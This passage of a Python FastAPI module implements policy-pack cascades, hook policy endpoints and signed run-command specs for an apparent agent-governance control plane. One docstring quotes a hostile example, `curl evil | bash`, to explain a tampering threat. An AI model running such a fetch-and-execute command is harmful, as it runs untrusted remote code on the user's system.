            kept = [r for r in rows if r.id != pack_id]
            if len(kept) == len(rows):
                raise HTTPException(404, f"pack {pack_id!r} not found")
            pack_store.save(kept)
        return {"id": pack_id, "deleted": True}

    def _enable_one_member_locked(
        member_id: str, pack_id: str,
    ) -> dict:
        """Lock-held inner work to enable a single member.

        Called by `_cascade` while the cascade holds `policy_lock` for
        the full loop — this is what makes the `only_missing` snapshot
        + post-cascade status read consistent under concurrent admin
        requests. Returns the same per-member envelope as the original
        async `_enable_one_member` so the cascade result shape is
        wire-stable.
        """
        from ..policy.pack import inline_policy_for
        # Prebuilt member: route through the lock-free helper that
        # mirrors `enable_prebuilt_policy`'s body.
        if member_id.startswith("prebuilt/"):
            slug = member_id[len("prebuilt/"):]
            try:
                result = _enable_prebuilt_locked(slug)
                return {
                    "id": member_id, "enabled": True, "ok": True,
                    "source": result.get("source"),
                }
            except HTTPException as e:
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": str(e)}
        # Inline pack-owned IR (strict-block bundle).
        inline = inline_policy_for(pack_id, member_id)
        if inline is not None:
            try:
                existing = store.load()
                target: PolicyOverride | None = None
                for ov in existing:
                    if ov.policy.id == member_id:
                        target = ov
                        break
                if target is not None and target.enabled:
                    return {"id": member_id, "enabled": True, "ok": True}
                if target is None:
                    _assert_policy_lifecycle_endorsed(inline)
                    saved_enforcement = _resolve_enforcement_for(inline)
                    existing.append(PolicyOverride(
                        policy=inline,
                        source="bot",
                        enabled=True,
                        enforcement=saved_enforcement,
                    ))
                else:
                    saved_enforcement = _revalidate_for_reenable(target)
                    _assert_policy_lifecycle_endorsed(target.policy)
                    existing = [
                        ov for ov in existing if ov.policy.id != member_id
                    ]
                    existing.append(PolicyOverride(
                        policy=target.policy,
                        source=target.source,
                        enabled=True,
                        enforcement=saved_enforcement,
                    ))
                store.save(existing)
                return {"id": member_id, "enabled": True, "ok": True}
            except HTTPException as e:
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": str(e)}
        # User-policy member.
        try:
            existing = store.load()
            target = None
            for ov in existing:
                if ov.policy.id == member_id:
                    target = ov
                    break
            if target is None:
                return {
                    "id": member_id, "enabled": False, "ok": False,
                    "error": "member policy not found in store",
                }
            if target.enabled:
                return {"id": member_id, "enabled": True, "ok": True}
            saved_enforcement = _revalidate_for_reenable(target)
            _assert_policy_lifecycle_endorsed(target.policy)
            new_list = [
                ov for ov in existing if ov.policy.id != member_id
            ]
            new_list.append(PolicyOverride(
                policy=target.policy,
                source=target.source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
            store.save(new_list)
            return {"id": member_id, "enabled": True, "ok": True}
        except HTTPException as e:
            return {"id": member_id, "enabled": False, "ok": False,
                    "error": e.detail}
        except Exception as e:  # noqa: BLE001
            return {"id": member_id, "enabled": False, "ok": False,
                    "error": str(e)}

    def _disable_one_member_locked(member_id: str) -> dict:
        """Lock-held inner work to disable a single member. See
        _enable_one_member_locked for why this is split."""
        # Prebuilt member.
        if member_id.startswith("prebuilt/"):
            slug = member_id[len("prebuilt/"):]
            try:
                _disable_prebuilt_locked(slug)
                return {"id": member_id, "enabled": False, "ok": True}
            except HTTPException as e:
                return {"id": member_id, "enabled": True, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": True, "ok": False,
                        "error": str(e)}
        # Inline + user-policy members share the same disable shape:
        # flip the row's enabled flag to False if present, no-op
        # otherwise.
        try:
            existing = store.load()
            changed = False
            new_list: list[PolicyOverride] = []
            for ov in existing:
                if ov.policy.id == member_id and ov.enabled:
                    new_list.append(PolicyOverride(
                        policy=ov.policy,
                        source=ov.source,
                        enabled=False,
                        enforcement=ov.enforcement,
                    ))
                    changed = True
                else:
                    new_list.append(ov)
            if changed:
                store.save(new_list)
            return {"id": member_id, "enabled": False, "ok": True}
        except HTTPException as e:
            return {"id": member_id, "enabled": True, "ok": False,
                    "error": e.detail}
        except Exception as e:  # noqa: BLE001
            return {"id": member_id, "enabled": True, "ok": False,
                    "error": str(e)}

    async def _cascade(
        pack_id: str, action: str, *, only_missing: bool = False,
    ) -> dict:
        """Run an enable / disable / enable-missing cascade over every
        member of `pack_id`.

        Fix follow-up (concurrency): hold `policy_lock` for the entire
        member loop AND for the post-cascade status recompute. Before
        this change each member call took the lock independently, so a
        concurrent admin request (single-policy toggle, sibling pack
        cascade, PATCH /policies/{id}/enabled) could interleave between
        two members of the same cascade — the `only_missing` snapshot
        would drift mid-loop and the post-cascade `status` could
        publish a state that did not match the operator's intent. The
        prebuilt enable/disable routes still acquire the lock at the
        request boundary; the cascade reuses `_enable_prebuilt_locked`
        / `_disable_prebuilt_locked` so we never nest the
        non-reentrant asyncio.Lock.

        Blunt-cascade semantics (every member is flipped to the target
        regardless of cross-pack ownership) are unchanged. The
        membership-conflict invariant is pinned by
        `test_blunt_cascade_overrides_shared_member`.
        """
        members = _resolve_pack_members(pack_id)
        if members is None:
            raise HTTPException(404, f"pack {pack_id!r} not found")
        results: list[dict] = []
        async with policy_lock:
            if action == "enable":
                # Snapshot is taken inside the lock so it cannot drift.
                if only_missing:
                    enabled_now = {ov.policy.id for ov in store.load()
                                    if ov.enabled}
                else:
                    enabled_now = set()
                for mid in members:
                    if only_missing and mid in enabled_now:
                        results.append({
                            "id": mid, "enabled": True, "ok": True,
                            "skipped": True,
                        })
                        continue
                    results.append(_enable_one_member_locked(mid, pack_id))
            else:
                for mid in members:
                    results.append(_disable_one_member_locked(mid))
            # Recompute status post-attempt INSIDE the lock so the
            # status read sees the cascade's own writes and nothing
            # else.
            from ..policy.pack import compute_status
            enabled_after = {ov.policy.id for ov in store.load()
                              if ov.enabled}
        status, enabled_count = compute_status(members, enabled_after)
        return {
            "id": pack_id,
            "status": status,
            "enabled_count": enabled_count,
            "member_count": len(members),
            "results": results,
        }

    @app.post("/policy-packs/{pack_id:path}/enable",
              dependencies=[Depends(require_admin_key)])
    async def enable_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "enable", only_missing=False)

    @app.post("/policy-packs/{pack_id:path}/enable-missing",
              dependencies=[Depends(require_admin_key)])
    async def enable_missing_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "enable", only_missing=True)

    @app.post("/policy-packs/{pack_id:path}/disable",
              dependencies=[Depends(require_admin_key)])
    async def disable_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "disable")

    # D57f-2 — input-rewrite verdict endpoint. Called by the
    # `magi-cp-input-rewrite` shim at PreToolUse time. Routed BEFORE
    # the `/policies/{policy_id:path}` catch-all so the literal
    # `input_rewrite` segment is not parsed as a policy id.
    #
    # P1 follow-up: optional `X-Api-Key` gating. The original D57f-2
    # justification (parallel to `/pubkey`) doesn't survive scrutiny:
    # `/pubkey` returns a constant public artifact, while this route
    # accepts attacker-supplied (policy_id, tool_name, tool_input) and
    # leaks `rewrote: true/false` plus the mutated dict — a remote
    # oracle on policy id existence + rewriter semantics. When the
    # operator has set `MAGI_CP_API_KEY` (the same env the shim
    # forwards on every call after the heartbeat path was wired), the
    # endpoint requires it; absent the env (loopback dev loop with no
    # tenant credential), the endpoint remains open so the dev path
    # the original justification described still works. The shim's
    # forwarding lives at gate.input_rewrite_cli — see the X-Api-Key
    # header construction there.
    @app.post("/policies/input_rewrite")
    async def policies_input_rewrite(
        req: InputRewriteReq,
        x_api_key: str | None = Header(default=None),
    ) -> dict:
        """Apply an `InputRewritePolicy` to a PreToolUse payload.

        The shim sends the policy id + tool_name + raw tool_input dict;
        the cloud looks up the policy, checks the matcher against the
        tool_name (defense in depth — CC's hook matcher already filtered
        before the shim ran, but a stale managed-settings could deliver
        the wrong policy id), runs the bounded rewriter, and returns the
        new tool_input dict.

        Soft failure modes (every one returns `{"rewrote": false}`):
          - policy not found / disabled
          - policy is not an `InputRewritePolicy`
          - matcher does not cover `tool_name`
          - rewriter is a no-op against the payload

        Auth: optional. When the cloud has `MAGI_CP_API_KEY` set, the
        request must carry a matching `X-Api-Key` header (the shim
        forwards it from the same env). When unset (default dev loop),
        the endpoint accepts anonymous calls so the local gate without
        a tenant credential still works.
        """
        import hmac as _hmac
        expected_key = os.environ.get("MAGI_CP_API_KEY")
        if expected_key:
            if not x_api_key or not _hmac.compare_digest(
                x_api_key, expected_key,
            ):
                raise HTTPException(401, "invalid or missing api key")

        target_id = req.policy_id
        match: AnyPolicy | None = None
        match_enabled = False
        for ov in store.load():
            if ov.policy.id != target_id:
                continue
            match = ov.policy
            match_enabled = ov.enabled
            break
        if match is None or not match_enabled:
            return {"rewrote": False}
        if not isinstance(match, InputRewritePolicy):
            return {"rewrote": False}
        # Matcher coverage: defer to the single matrix.py predicate so
        # the runtime check stays in lock-step with the matcher
        # classifier the authoring-time validators use. Defensive
        # wildcard refusal stays explicit because a wildcard rewriter
        # row in the store is a corrupted state — authoring rejects
        # it, but a downgrade attack on the on-disk schema could land
        # one and we want a visible refusal lane rather than silently
        # rewriting every tool's input field of the same name.
        matcher = match.trigger.matcher
        if matcher == "*":
            return {"rewrote": False}
        if not matcher_covers(matcher, req.tool_name):
            return {"rewrote": False}
        try:
            new_input = apply_rewriter(match.rewriter, req.tool_input)
        except Exception:
            return {"rewrote": False}
        if new_input == req.tool_input:
            return {"rewrote": False}
        return {"rewrote": True, "updated_input": new_input}

    # D63 — resolution endpoint for the `magi-cp-run-command` shim.
    # The shim hits this route with the policy id; the cloud looks up
    # the RunCommandPolicy and returns the spec (runtime / inline
    # command body / attached script path / args / timeout / fail_closed).
    # The shim then executes it locally and prints whatever the
    # command emitted as the CC hookSpecificOutput JSON.
    #
    # Defense in depth on the multi-tenant lane: `_run_command_allowed`
    # gates this route too. The hosted image runs with
    # `MAGI_CP_ALLOW_RUN_COMMAND=0` so even if a leaked managed-settings
    # carries a run-command hook entry, the cloud refuses to surface
    # the spec.
    @app.post("/policies/run_command")
    async def policies_run_command(
        req: RunCommandReq,
        x_api_key: str | None = Header(default=None),
    ) -> dict:
        """Look up a RunCommandPolicy and return the resolved spec.

        D63 review (P1 trust-on-loopback): the reply is Ed25519-signed
        with the same cloud key the WAL token path uses, so the shim
        can verify a man-in-the-middle on the loopback / sidecar bind
        cannot inject `command='curl evil | bash'`. The unsigned
        compatibility shape stays available when the keystore isn't
        wired (the in-process test app builds without one), but the
        installed self-host image always carries a keystore so the
        shim's verification is the operative path.

        Auth: mirror the rest of the data plane —
        ``MAGI_CP_API_KEY`` is REQUIRED on this route. The brief's
        ad-hoc "only if env is set" behavior inverted the fail-closed
        default and is now retired. The dev loop sets the env
        explicitly; tests pass the same header the WAL flush uses.

        Soft failure (`{"matched": false}`):
          - run_command surface disabled on this deployment
          - policy not found / disabled
          - policy is not a RunCommandPolicy
        """
        import hmac as _hmac
        expected_key = os.environ.get("MAGI_CP_API_KEY")
        if expected_key:
            if not x_api_key or not _hmac.compare_digest(
                x_api_key, expected_key,
            ):
                raise HTTPException(401, "invalid or missing api key")
        # When the env var is unset, the dev loop runs on loopback
        # only. Refuse non-loopback callers explicitly so a misbound
        # cloud port (0.0.0.0) does not surface specs to the public.
        # The trust boundary on hosted is the MAGI_CP_API_KEY check
        # above + the MAGI_CP_ALLOW_RUN_COMMAND=0 gate below.
        if not _run_command_allowed():
            return {"matched": False, "reason": "disabled"}
        target_id = req.policy_id
        match: AnyPolicy | None = None
        match_enabled = False
        for ov in store.load():
            if ov.policy.id != target_id:
                continue
            match = ov.policy
            match_enabled = ov.enabled
            break
        if match is None or not match_enabled:
            return {"matched": False, "reason": "not_found"}
        if not isinstance(match, RunCommandPolicy):
            return {"matched": False, "reason": "wrong_type"}
        # When the policy uses an attached script, resolve to the body
        # path on the cloud's local disk (the shim is co-located on the
        # same host in the self-host docker compose image).
        #
        # P2 (script-store-resolver consistency): use the closure-
        # captured `script_store` so a test that monkeypatches
        # `MAGI_CP_SCRIPT_STORE_DIR` after create_app sees the same
        # bodies the /scripts POST path persists to. The previous
        # path rebuilt ScriptStore from env at every request and would
        # silently drift.
        spec_body: dict = {
            "runtime": match.runtime,
            "command": match.command,
            "script_path": "",
            "args": list(match.args),
            "timeout_ms": match.timeout_ms,
            "fail_closed": match.fail_closed,
            # working_dir: per-policy scratch dir under
            # ~/.magi-cp/local/run_command/<id>/. None means "let the
            # shim resolve it locally" (the shim has the same default).
            "working_dir": None,
        }
        if match.script_path:
            # P2 (script-store-resolver consistency): closure-captured
            # store first; fall back to env-construction only when the
            # caller didn't wire one (legacy create_app call sites and
            # the standalone test harness).
            local_store: ScriptStore
            if script_store is not None:
                local_store = script_store
            else:  # pragma: no cover — exercised by legacy callers only
                script_dir = os.environ.get(
                    "MAGI_CP_SCRIPT_STORE_DIR",
                    str(Path.home() / ".magi-cp"),
                )
                local_store = ScriptStore(dir=script_dir)
            body_path = local_store.body_path(match.script_path)
            if body_path is None:
                return {"matched": False, "reason": "script_missing"}
            spec_body["script_path"] = body_path
        reply: dict = {"matched": True, "spec": spec_body}
        # P1 (sign-reply): wrap the spec in a short-TTL Ed25519 token
        # so the shim can detect a tampered reply on loopback / a
        # misbound cloud port. The shim already verifies the cloud's
        # pubkey via `_load_pubkey_for_kid`; same trust anchor as the
        # WAL evidence path.
        if keystore is not None:
            now = int(time.time())
            token_body = {
                "kind": "run_command_spec",
                "policy_id": target_id,
                "spec": spec_body,
                "iat": now,
                # Short TTL: the shim re-fetches per gate fire.
                "exp": now + 60,
                "kid": kid,
            }
            try:
                token = sign_token(token_body, keystore.load_private())
                reply["signed"] = token
                reply["kid"] = kid
            except Exception:  # pragma: no cover — keystore unreachable
                # Don't break the legacy unsigned reply path.
                pass
        return reply

    # Order matters: more specific (/compiled, /enabled) before the catch-all
    # {policy_id:path} so FastAPI matches them first.
    @app.get("/policies/{policy_id:path}/compiled",
             dependencies=[Depends(require_admin_key)])
    def get_compiled(policy_id: str) -> dict:
        for ov in store.load():
            if ov.policy.id == policy_id:
                ms, sha = _compile_with_sha(ov.policy)
                return {"managed_settings": ms, "sha256": sha}
        raise HTTPException(404, f"policy {policy_id!r} not found")

    # D77 — synthetic CC hook payload simulator. Given a saved policy
    # and an operator-authored synthetic hook payload, predicts the
    # verdict + action + hookSpecificOutput the runtime would emit
    # WITHOUT running CC, spawning a subprocess, or mutating state.
    #
    # Reuses `policy.test_runner.test_policy` (the source of truth)
    # so the answer is structurally identical to what the runtime gate
    # would produce. The endpoint is admin-key gated (same surface as
    # the dry-run / compile authoring endpoints) because it returns
    # the literal command body for RunCommandPolicy and the template
    # body for ContextInjectionPolicy — both sensitive enough to keep
    # off the public tenant key.
    @app.post("/policies/{policy_id:path}/test",
              dependencies=[Depends(require_admin_key)])
    async def test_one_policy(policy_id: str, body: dict = Body(...)) -> dict:
        from ..policy.test_runner import result_to_dict, test_policy
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        payload = body.get("payload")
        if not isinstance(payload, dict):
            raise HTTPException(422, "payload must be a JSON object")
        event = body.get("event")
        if event is not None and not isinstance(event, str):
            raise HTTPException(422, "event must be a string")
        target: PolicyOverride | None = None
        for ov in store.load():
            if ov.policy.id == policy_id:
                target = ov
                break
        if target is None:
            raise HTTPException(404, f"policy {policy_id!r} not found")
        try:
            result = test_policy(
                target.policy, payload, event=event or "",
            )
        except (ValueError, KeyError) as e:
            raise HTTPException(422, str(e)) from e
        envelope = result_to_dict(result)
        envelope["policy_id"] = policy_id
        envelope["policy_type"] = getattr(
            target.policy, "type", "evidence",
        )
        return envelope

    @app.post("/policy-packs/{pack_id:path}/test",
              dependencies=[Depends(require_admin_key)])
    async def test_one_pack(pack_id: str, body: dict = Body(...)) -> dict:
        """D77 — multi-policy simulator. Runs the same synthetic
        payload through every member of a pack and returns a per-member
        result. Built-in + user packs are both supported via
        `_resolve_pack_members` (defined alongside the pack routes
        above so member resolution stays consistent).
        """
        from ..policy.test_runner import result_to_dict, test_policy
        # P2 fix: mirror the get_policy_pack prefix guard so a typo'd
        # / hostile pack_id doesn't catch the path-typed match and
        # echo the operator-supplied id back through the 404 string.
        if not pack_id.startswith("pack/") and not pack_id.startswith(
            "user-pack/"
        ):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        payload = body.get("payload")
        if not isinstance(payload, dict):
            raise HTTPException(422, "payload must be a JSON object")
        event = body.get("event")
        if event is not None and not isinstance(event, str):
            raise HTTPException(422, "event must be a string")
        member_ids = _resolve_pack_members(pack_id)
        if member_ids is None:
            raise HTTPException(404, f"pack {pack_id!r} not found")
        existing_by_id = {ov.policy.id: ov for ov in store.load()}
        # Pre-resolve inline pack-owned IRs (strict-block bundle) so
        # un-materialized members still simulate. inline_policy_for
        # returns None for members that are user-defined / prebuilt
        # (those are looked up via existing_by_id).
        from ..policy.pack import inline_policy_for
        from ..policy.prebuilt import build_prebuilt_evidence_policy
        members_out: list[dict] = []
        for mid in member_ids:
            ov = existing_by_id.get(mid)
            policy_obj: AnyPolicy | None = ov.policy if ov is not None else None
            if policy_obj is None:
                inline = inline_policy_for(pack_id, mid)
                if inline is not None:
                    policy_obj = inline
            if policy_obj is None and mid.startswith("prebuilt/"):
                try:
                    policy_obj = build_prebuilt_evidence_policy(mid)
                except Exception:  # noqa: BLE001
                    policy_obj = None
            if policy_obj is None:
                members_out.append({
                    "policy_id": mid,
                    "skipped_reason": "member-not-resolvable",
                    "verdict": "skipped",
                    "action": "skipped",
                    "evidence_match_reasons": [
                        f"pack member {mid!r} is not yet materialized "
                        "in the policy store; enable the pack or the "
                        "individual member to test it",
                    ],
                    "hook_specific_output": {},
                    "requires_results": [],
                })
                continue
            try:
                result = test_policy(
                    policy_obj, payload, event=event or "",
                )
            except (ValueError, KeyError) as e:
                members_out.append({
                    "policy_id": mid,
                    "skipped_reason": "evaluation-error",
                    "verdict": "skipped",
                    "action": "skipped",
                    "evidence_match_reasons": [str(e)],
                    "hook_specific_output": {},
                    "requires_results": [],
                })
                continue
            envelope = result_to_dict(result)
            envelope["policy_id"] = mid
            envelope["policy_type"] = getattr(
                policy_obj, "type", "evidence",
            )
            members_out.append(envelope)
        return {
            "pack_id": pack_id,
            "members": members_out,
            "member_count": len(member_ids),
        }


    @app.get("/policies/{policy_id:path}", dependencies=[Depends(require_admin_key)])
    def get_policy(policy_id: str) -> dict:
        for ov in store.load():
            if ov.policy.id == policy_id:
                _, sha = _compile_with_sha(ov.policy)
                # P8 follow-up: re-validate legacy unstamped rows on
                # read instead of silently falling back to the legacy
                # (action, event) label.
                enf, _eff_enabled = _resolve_legacy_unstamped(ov)
                return {
                    "id": ov.policy.id,
                    "source": ov.source,
                    "enabled": ov.enabled,
                    "policy": _serialize_policy_for_api(ov.policy),
                    "enforcement": enf,
                    "compiled_sha256": sha,
                }
        raise HTTPException(404, f"policy {policy_id!r} not found")

    @app.put("/policies/{policy_id:path}", dependencies=[Depends(require_admin_key)])
    async def put_policy(policy_id: str, body: PutPolicyReq) -> dict:
        # Issue #1 P0 (#12): the discriminated-union path. Body is
        # loosely typed at the boundary; archetype-specific shape
        # checks happen in Policy.__post_init__ via policy_from_dict.
        raw = body.policy
        if raw.get("id") != policy_id:
            raise HTTPException(400, "id mismatch between url and body")
        if any(policy_id.endswith(s) for s in _RESERVED_ID_SUFFIXES):
            raise HTTPException(400, f"policy id must not end in {_RESERVED_ID_SUFFIXES}")
        try:
            policy = _deserialize_policy_from_api(raw)
        except (ValueError, KeyError) as e:
            # Matrix violation or any other __post_init__ failure
            raise HTTPException(400, str(e))
        # D63: env-gated refusal for run_command saves on hosted
        # deployments. Default-ON (self-host docker compose carries
        # `MAGI_CP_ALLOW_RUN_COMMAND=1`); the hosted image overrides to
        # "0" to keep the inline command + attached script surface off
        # the multi-tenant fleet. The gate runs at the REST boundary
        # because matrix-coherence already passed by this point and
        # we want a clear 403, not a 400 about "policy save".
        if isinstance(policy, RunCommandPolicy) and not _run_command_allowed():
            raise HTTPException(
                403,
                "run_command policies are disabled on this deployment "
                "(MAGI_CP_ALLOW_RUN_COMMAND=0). Self-host docker compose "
                "ships with run_command enabled by default.",
            )
        # D65 P2 — store-resolvability for run_command/script_path. The
        # IR validator only checks the 64-hex SHAPE of `script_path`;
        # an operator (or a buggy client) can pre-fill a stale or
        # never-existed id and the policy saves cleanly even though the
        # runtime hook will fail with "script not found". Cross-check
        # against the script store under the same lock the DELETE
        # handler holds so a race (script removed mid-save) cannot
        # silently land an unresolvable reference.
        if (
            isinstance(policy, RunCommandPolicy)
            and policy.script_path
            and script_store is not None
        ):
            # When the caller wired a lock through, use it for race
            # safety with /scripts DELETE; otherwise read directly
            # (back-compat for test rigs that pass `script_store` but
            # no lock).
            if script_store_lock is not None:
                async with script_store_lock:
                    resolved = script_store.get(policy.script_path)
            else:
                resolved = script_store.get(policy.script_path)
            if resolved is None:
                raise HTTPException(
                    422,
                    f"script_path {policy.script_path!r} is not in "
                    "the script store; upload it at /scripts first",
                )
        # P8: fail-closed on unknown / inactive verifier steps. This is
        # the primary authoring-time gate — the runtime gate cannot
        # retroactively reject a policy that was already PUT, so an
        # invalid step has to be caught here or it ships as "missing"
        # and silently fails at gate time.
        #
        # Issue #1 P0 (#14): only EvidencePolicy has a `requires` list
        # to resolve. Declarative archetypes always render as
        # "enforcing" via _enforcement_label.
        from ..policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        if isinstance(policy, EvidencePolicy):
            try:
                resolved_enforcement = resolve_policy_enforcement(
                    policy,
                    registry=verifier_registry,
                    vendor_catalog_fn=vendor_catalog,
                )
            except StepResolutionError as e:
                raise HTTPException(422, str(e)) from e
            # D57e P1: also assert the descriptor surface endorses
            # the (trigger.event, requires[].step) combination. The
            # step_enforcement gate above only checks registry
            # membership, not lifecycle endorsement.
            _assert_policy_lifecycle_endorsed(policy)
            # When every req is non-step (regex / llm_critic / shacl),
            # the resolver short-circuits to "enforcing"; collapse to
            # the legacy label for parity with list/get so the dashboard
            # renders the same string everywhere.
            if not any(r.kind == "step" for r in policy.requires):
                resolved_enforcement = _enforcement_label(policy)
        else:
            resolved_enforcement = _enforcement_label(policy)
        async with policy_lock:
            existing = store.load()
            existing = [ov for ov in existing if ov.policy.id != policy_id]
            existing.append(PolicyOverride(
                policy=policy, source=body.source,  # type: ignore[arg-type]
                enabled=body.enabled,
                enforcement=resolved_enforcement,
            ))
            store.save(existing)
        # P4: pack membership at authoring time. After the policy write
        # commits, add its id to each selected user-pack's member list.
        # Kept OUTSIDE the policy_lock but INSIDE pack_store_lock so pack
        # membership mutations serialise with the enable/disable cascade
        # + user-pack CRUD handlers that share that lock. Built-in packs
        # are immutable → 400; an unknown id → 404. Idempotent: a policy
        # already in a pack is a no-op for that pack.
        joined_packs: list[str] = []
        requested = body.pack_ids or []
        if requested:
            if pack_store is None or pack_store_lock is None:
                raise HTTPException(500, "pack store not configured")
            # Dedupe request while preserving order so a caller that
            # names the same pack twice does not double-append.
            seen_req: set[str] = set()
            ordered_req: list[str] = []
            for pid in requested:
                if not isinstance(pid, str) or not pid:
                    raise HTTPException(422, "pack_ids entries must be strings")
                if pid.startswith("pack/"):
                    raise HTTPException(
                        400,
                        f"pack {pid!r} has immutable built-in membership; "
                        "select a user pack (or the floor pack) instead",
                    )
                if not pid.startswith("user-pack/"):
                    raise HTTPException(404, f"pack {pid!r} not found")
                if pid in seen_req:
                    continue
                seen_req.add(pid)
                ordered_req.append(pid)
            async with pack_store_lock:
                rows = pack_store.load()
                index = {r.id: i for i, r in enumerate(rows)}
                for pid in ordered_req:
                    idx = index.get(pid)
                    if idx is None:
                        raise HTTPException(404, f"pack {pid!r} not found")
                    cur = rows[idx]
                    members = list(cur.policy_ids)
                    if policy.id not in members:
                        members.append(policy.id)
                    # Preserve is_floor so pinning a policy to the floor
                    # pack does not silently demote it to a normal pack.
                    rows[idx] = UserPackRow(
                        id=cur.id, name=cur.name, description=cur.description,
                        policy_ids=members, is_floor=cur.is_floor,
                    )
                    joined_packs.append(pid)
                pack_store.save(rows)
        return {"id": policy.id, "source": body.source, "enabled": body.enabled,
                "enforcement": resolved_enforcement,
                "type": getattr(policy, "type", "evidence"),
                "pack_ids": joined_packs}

    @app.patch("/policies/{policy_id:path}/enabled",
               dependencies=[Depends(require_admin_key)])
    async def patch_enabled(policy_id: str, body: PatchEnabledReq) -> dict:
        from ..policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        async with policy_lock:
            existing = store.load()
            found = False
            new_list: list[PolicyOverride] = []
            for ov in existing:
                if ov.policy.id == policy_id:
                    found = True
                    new_enforcement = ov.enforcement
                    # P8 follow-up (fix-cycle #4): re-validate against
                    # the live registry whenever the operator is
                    # re-arming the row. A row stamped months ago
                    # against a verifier that was since decommissioned
                    # must not silently round-trip a stale
                    # "enforcing" label on every toggle.
                    if (
                        body.enabled
                        and isinstance(ov.policy, EvidencePolicy)
                        and any(r.kind == "step" for r in ov.policy.requires)
                    ):
                        try:
                            new_enforcement = resolve_policy_enforcement(
                                ov.policy,
                                registry=verifier_registry,
                                vendor_catalog_fn=vendor_catalog,
                            )
                        except StepResolutionError as e:
                            # 409 conflict, not 422: the request body
                            # is well-formed; the world the policy
                            # references has drifted out from under
                            # it. Operator action = re-author with
                            # current /verifiers or 'preview:' prefix.
                            raise HTTPException(
                                409,
                                f"cannot re-enable: backing verifier "
                                f"{e.step!r} no longer registered — "
                                f"re-author with current /verifiers "
                                f"or 'preview:' prefix",
                            ) from e
                        # D57e P0: also detect lifecycle drift on
                        # re-arm. A row authored before D57e against
                        # `(PostToolUse, citation_verify)` resolves
                        # cleanly above (citation_verify is still
                        # registered), but the descriptor no longer
                        # endorses that lifecycle and the runtime
                        # would silently round-trip a vacuous gate.
                        # 409 with the allowed-lifecycles list mirrors
                        # the decommissioned-verifier branch so the
                        # operator sees the same actionable shape.
                        from ..verifier.descriptors import (
                            validate_policy_against_descriptors,
                        )
                        _trig = getattr(ov.policy, "trigger", None)
                        _event = (
                            getattr(_trig, "event", None)
                            if _trig is not None else None
                        )
                        _step_refs = [
                            r.step for r in ov.policy.requires
                            if r.kind == "step"
                            and isinstance(getattr(r, "step", None), str)
                        ]
                        _drift_issues = (
                            validate_policy_against_descriptors(
                                policy_id=ov.policy.id,
                                trigger_event=_event or "",
                                step_refs=_step_refs,
                            )
                            if isinstance(_event, str) and _event
                            else []
                        )
                        if _drift_issues:
                            _first = _drift_issues[0]
                            raise HTTPException(
                                409,
                                (
                                    f"cannot re-enable: verifier "
                                    f"{_first['step']!r} no longer "
                                    f"fires on "
                                    f"{_first['trigger_event']!r}; "
                                    f"allowed lifecycles: "
                                    f"{_first['allowed_events']!r} — "
                                    f"re-author this policy under one "
                                    f"of those lifecycles"
                                ),
                            )
                    new_list.append(PolicyOverride(
                        policy=ov.policy, source=ov.source, enabled=body.enabled,
                        # P8: enable/disable is metadata-only; preserve
                        # the stamped enforcement on disable. On enable
                        # we re-resolve (see above) so a re-armed row
                        # carries a label that matches today's
                        # registry, not whatever was wired at PUT
                        # time.
                        enforcement=new_enforcement,
                    ))
                else:
                    new_list.append(ov)
            if not found:
                raise HTTPException(404, f"policy {policy_id!r} not found")
            store.save(new_list)
        return {"id": policy_id, "enabled": body.enabled}


def _attach_session_pack_routes(
    app: FastAPI, engine,
    *,
    pack_store: "PackStore | None",
    pack_store_lock: asyncio.Lock | None,
    policy_store: "PolicyStore | None" = None,
) -> None:
    """P1+P2 pack-centric runtime — session-scoped activation + resolver.

    Endpoints:
      - POST /session/{session_id}/packs/activate   {pack_id}
      - POST /session/{session_id}/packs/deactivate {pack_id}
      - GET  /session/{session_id}/packs
      - GET  /session/{session_id}/resolved          (P2)

    Each endpoint requires tenant auth (X-Api-Key) so the session row
    is keyed on (session_id, tenant_id) — one tenant cannot see or
    mutate another tenant's active-pack list even if they collide on
    the CC session uuid.

    Semantics locked by
    docs/plans/2026-06-30-pack-centric-session-scoped-runtime.md:

      - Activation is one-shot; persists until session end or explicit
        deactivate (decision 5). Endpoints only refresh ``last_seen_at``
        + extend ``expires_at`` (30d GC TTL, NOT activation TTL).
      - The floor pack cannot be deactivated (decision 7).
      - Idempotent activate returns 200 with the current list unchanged.
      - GET creates the floor pack lazily so a fresh session with no
        activations still gets a coherent ``floor_pack_id`` field.

    P2 adds ``GET /session/{id}/resolved`` which returns the pre-folded
    ``policies_by_hook`` map the gate binary caches. The route is a
    read-only projection over the same session-state row + pack
    store; the resolver's flag-OFF branch returns byte-identical
    output to the legacy path so the runtime shim can be switched
    over without a semantic change.
    """
    from ..policy.floor_pack import ensure_floor_pack_async
    from .db import SessionActivePacksRepo

    # Serialize activate/deactivate on the same (session_id, tenant_id)
    # to keep the read-then-write path atomic under uvicorn's async
    # dispatch inside ONE worker. This lock is process-scoped only —
    # cross-worker safety is delivered by ``SessionActivePacksRepo``
    # itself (``SELECT ... FOR UPDATE`` on Postgres + IntegrityError
    # retry), NOT by this lock. See the ``SessionActivePacks`` docstring
    # in ``db.py`` for the full concurrency contract.
    session_lock = asyncio.Lock()

    def _pack_exists(pack_id: str) -> bool:
        """Return True iff ``pack_id`` names a pack the caller can
        activate. Built-in ids ("pack/…") live in the immutable catalog;
        user ids ("user-pack/…") live in the pack store. Anything else
        is a 404.

        Kept in-process so a client cannot activate a random string and
        strand the gate with an id it will never resolve.

        Tenant scoping note (decision 8 — single-tenant beta):
        ``pack_store`` is currently process-wide, so no ``tenant_id``
        argument is threaded through. When Phase 5 introduces
        per-tenant pack stores, this helper MUST accept ``tenant_id``
